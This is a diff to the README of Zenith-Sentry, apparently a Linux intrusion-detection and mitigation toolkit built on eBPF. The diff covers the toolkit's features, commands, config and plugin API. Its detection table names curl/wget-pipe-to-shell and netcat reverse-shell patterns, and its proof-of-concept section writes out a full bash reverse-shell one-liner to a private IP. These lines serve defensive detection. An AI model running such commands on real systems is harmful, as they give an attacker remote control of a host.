@@ -44,6 +44,25 @@ Zenith-Sentry is a **host-based intrusion detection and forensic toolkit** for L
 
 ---
 
+## 🌟 What's New in v2.0 (Hardened)
+- **🛡️ Active Mitigation Engine**: Real-time containment via `SIGKILL` and `IPTables`.
+- **⚡ Unified eBPF Monitor**: Seamless kernel-level visibility for process and network events.
+- **🚀 Dependency Enforcement**: Automated environment verification for `sudo` reliability.
+- **🧹 Clean Slate Logic**: Production-sanitized codebase (zero comments, zero metadata).
+
+---
+
+## ⚡ Rapid Deployment
+The quickest path to a protected host:
+```bash
+git clone https://github.com/syed-sameer-ul-hassan/Zenith-Sentry.git
+cd Zenith-Sentry
+./start.sh
+```
+*`start.sh` handles virtual environment creation, dependency installation, and TUI launch automatically.*
+
+---
+
 ## 📂 Detailed Project Structure
 The following manifest outlines the role of every component in the Zenith-Sentry v2.0 toolkit:
 
@@ -84,12 +103,21 @@ Zenith-Sentry/
     └── user_data/             # Timestamped JSON Forensic Reports
 ```
 
+### File Size Reference (v2.0 Clean)
+```text
+Total Size: ~140 KB | Language Distribution: Python (70%), C (20%), Shell (10%)
+- CORE ENGINE (zenith/*.py): 14.1 KB
+- UI LAYER (main.py, gui.py): 10.6 KB
+- eBPF LAYER (monitor.py, .c): 19 KB
+- SETUP & INSTALL (sh, requirements): 10.7 KB
+```
+
 ---
 
 ## 🏗️ Architecture Deep Dive
 Zenith-Sentry uses a decoupled, event-driven architecture designed for high-performance telemetry processing and real-time mitigation.
 
-### How a Scan Works
+### Scan Pipeline
 ```mermaid
 graph TD
     subgraph "Kernel Space"
@@ -110,96 +138,158 @@ graph TD
 
 ---
 
-## 🛡️ Hardened Security Engine (eBPF + Mitigation)
-Zenith-Sentry v2.0 integrates kernel-level visibility with proactive response.
+## 🛡️ Hardened Security Features
 
-### ⚡ Kernel-Level Visibility
-Captured via the `sys_execve` tracepoint, providing zero-evasion visibility:
-- **Zero Evasion**: Captures binary execution *before* the process starts.
-- **Full Context**: Captures PID, PPID, UID, GID, Command, and Exit status.
-- **Performance**: ~1-2 microseconds per event, <1% CPU impact.
-- **SIEM Ready**: Direct JSON streaming of kernel events for remote logging.
+### 0. eBPF Process Execution Monitoring ⚡
+**Kernel-level visibility with zero system calls overhead**
+| Feature | Details |
+|---|---|
+| **Visibility** | Every process execution captured at kernel level (cannot be hidden) |
+| **Performance** | ~1-2 microseconds per execve, <1% CPU impact |
+| **Output Format** | JSON for SIEM integration; human-readable CLI output |
+| **Security** | SHA256 verified BCC loader with pre-flight check |
 
-### 🛡️ Active Threat Mitigation
-When a high-risk signature is matched (e.g., unauthorized reverse shell):
-1. **Neutralize**: Automatically send `SIGKILL` to the offending process.
-2. **Contain**: Append `IPTables` rules to block the destination C2 IP.
-3. **Audit**: Forensic evidence recorded in `user_data/` for incident response.
+**Key Files:**
+- `process_execve_monitor.py` — Python BCC manager
+- `zenith/ebpf/execve_monitor.c` — Kernel program
 
-### 🔍 Built-in Detection Patterns
+### 1. Process Analysis — `ProcessDetector`
+Inspects the live process tree for malicious execution patterns:
 | Pattern | MITRE Tactic | Risk | Description |
 |---|---|---|---|
-| `curl ... \| bash` | Execution (T1059) | CRITICAL | Remote code execution via curl pipe |
-| `wget ... \| bash` | Execution (T1059) | CRITICAL | Remote code execution via wget pipe |
-| `/dev/tcp/...` | C2 (T1071) | CRITICAL | Direct bash reverse shell attempt |
-| `nc -e /bin/sh` | C2 (T1071) | HIGH | Netcat reverse shell connection |
+| `curl ... \| bash` | Execution (T1059) | CRITICAL | Remote code execution via pipe |
+| `wget ... \| bash` | Execution (T1059) | CRITICAL | Remote code execution via pipe |
+| `/dev/tcp/...` | C2 (T1071) | CRITICAL | Bash reverse shell attempt |
+| `nc -e /bin/sh` | C2 (T1071) | HIGH | Netcat reverse shell |
 | `\|sh` | Execution (T1059) | HIGH | Direct pipe to system shell |
+
+### 2. Active Mitigation Engine 🛡️
+Supports **proactive containment** of threats:
+- **Neutralization**: Immediate `SIGKILL` sent to the offending PID.
+- **Traffic Blocking**: Automatic `IPTables` rules to block C2 destination IPs.
+- **Safety Toggle**: Controlled via `config.yaml` or `--enforce` CLI flag.
 
 ---
 
-## 🚀 Usage & Deployment Guide
+## 🔌 Plugin System & Extension
+Zero-configuration plugin loading via `zenith/registry.py`.
 
-### Deployment (Rapid Start)
+### Writing a Custom Plugin
+```python
+from zenith.core import IDetector, Finding, RiskLevel, Severity
+
+class MyDetector(IDetector):
+    """Custom threat detector for suspicious behavior."""
+    name = "MyModule"
+    def __init__(self, procs, conns, sys_files, config, **kwargs):
+        self.procs = procs or {}
+    
+    def analyze(self):
+        findings = []
+        for pid, info in self.procs.items():
+            try:
+                if self._is_suspicious(info):
+                    findings.append(Finding(
+                        module=self.name,
+                        risk=RiskLevel.HIGH,
+                        severity=Severity.HIGH,
+                        tactic="Execution",
+                        description="Custom suspicious behavior detected",
+                        evidence={"pid": pid, "details": str(info)[:512]}
+                    ))
+            except Exception as e:
+                continue
+        return findings
+
+    def _is_suspicious(self, process_info):
+        return process_info.get('name') in ['nc', 'ncat', 'netcat']
+```
+
+---
+
+## 🚀 Advanced Command Reference
+
+### Option 1: Interactive TUI (Highly Recommended)
 ```bash
-# Clone and Run in one step
-git clone https://github.com/syed-sameer-ul-hassan/Zenith-Sentry.git
-cd Zenith-Sentry
 ./start.sh
 ```
+- **Navigation**: ↑ / ↓ to choose, Enter to run, `q` to return.
+- **Visuals**: Color-coded risk levels (Green/Yellow/Red).
 
-### 🛰️ eBPF Kernel Monitor (Standalone)
+### Option 2: Command-Line Interface (CLI)
 ```bash
-# Human-readable live stream
-sudo python3 process_execve_monitor.py --human
+# Basic full system scan
+python3 main.py full-scan
 
-# Production JSON stream for SIEM ingestion
-sudo python3 process_execve_monitor.py --source zenith/ebpf/execve_monitor.c
-```
-
-### 🔍 Zenith Engine CLI
-```bash
-# Full behavioral system scan with eBPF enabled
+# Full automated hunt with eBPF and JSON output
 sudo python3 main.py full-scan --ebpf --json
 
-# Scan specific components with filters
-python3 main.py process --risk-threshold 75 --verbose
+# Targeted component scan with risk threshold
+python3 main.py process --risk-threshold 50 --verbose
+```
+
+### Option 3: Real-Time eBPF Monitoring
+```bash
+# Direct kernel event stream (JSON)
+sudo python3 process_execve_monitor.py --source zenith/ebpf/execve_monitor.c
+
+# Human-readable live stream
+sudo python3 process_execve_monitor.py --human
+```
+
+---
+
+## 🔧 Configuration (`config.yaml`)
+```yaml
+network:
+  suspicious_ports: [4444, 5555, 1337, 6666, 6667, 8888]
+  ignore_loopback: true
+
+persistence:
+  scan_dirs: ["/etc/cron.d", "/lib/systemd/system"]
+
+mitigation:
+  safe_mode: true  # Set to false for live SIGKILL/IPTables
 ```
 
 ---
 
 ## 📈 Functional Proofs (PoC)
-Real-world evidence of v2.0 protection.
-
-#### [CASE 1] Detection of Reverse Shell
+#### [DETECTION]
 **Input:** `sh -i >& /dev/tcp/10.0.0.1/4444 0>&1`
-**Zenith Output:**
-```text
-[!] ALERT: HIGH RISK - Command & Control Pattern
-    - PID      : 8241
-    - Action   : Reverse Shell string matched
-    - RISK     : CRITICAL (100/100)
-```
+**Alert:** `[!] CRITICAL: Reverse Shell Pattern Matched (PID: 8241)`
 
-#### [CASE 2] Active Neutralization
-If `--enforce` is active, the threat is killed instantly.
-```text
-[MITIGATION] THREAT DETECTED — Neutralizing PID 8241
-[MITIGATION] SIGKILL sent. PID 8241 terminated.
-[MITIGATION] Remote IP 10.0.0.1 blocked via IPTables rules.
-```
+#### [MITIGATION]
+**Action:** `[MITIGATION] THREAT DETECTED — Reverse shell attempt`
+`[MITIGATION] SIGKILL sent. PID 8241 terminated.`
+`[MITIGATION] 10.0.0.1 blocked successfully via IPTables.`
 
 ---
 
-## 🔧 Requirements & Support
-- **Python**: 3.8+ (Automated via `start.sh`)
-- **Kernel**: 4.8+ (5.8+ recommended for Ring Buffer support)
-- **Privileges**: Root required for eBPF and Mitigation features.
-- **eBPF Support**: Run `sudo bash install_ebpf_deps.sh` if BCC/headers are missing.
+## 🔧 Installation & Troubleshooting
+
+### Requirements
+- **OS**: Linux (Kernel 4.8+, recommended 5.8+)
+- **Python**: 3.8+
+- **Privileges**: Root required for eBPF/Mitigation.
+
+### Issues & Solutions
+- **"BCC library not found"**: Run `sudo bash install_ebpf_deps.sh`.
+- **"Permission denied"**: Zenith-Sentry kernel features **must** run as root.
+- **"Python version too old"**: `start.sh` will prompt to install Python 3.8+.
+- **Missing Kernel Headers**: Install `linux-headers-$(uname -r)`.
+
+---
+
+## 📜 References & Resources
+- **MITRE ATT&CK**: [attack.mitre.org](https://attack.mitre.org)
+- **BCC (eBPF)**: [github.com/iovisor/bcc](https://github.com/iovisor/bcc)
+- **Zenith-Sentry v1.0**: Core detection logic for Linux endpoints.
 
 ---
 
 <p align="center">
   <b>Built for Linux defenders. Optimized for the modern threat landscape.</b>
   <br/>
-  MIT License | v2.0 Flagship Edition
+  MIT License | v2.0 flagship
 </p>
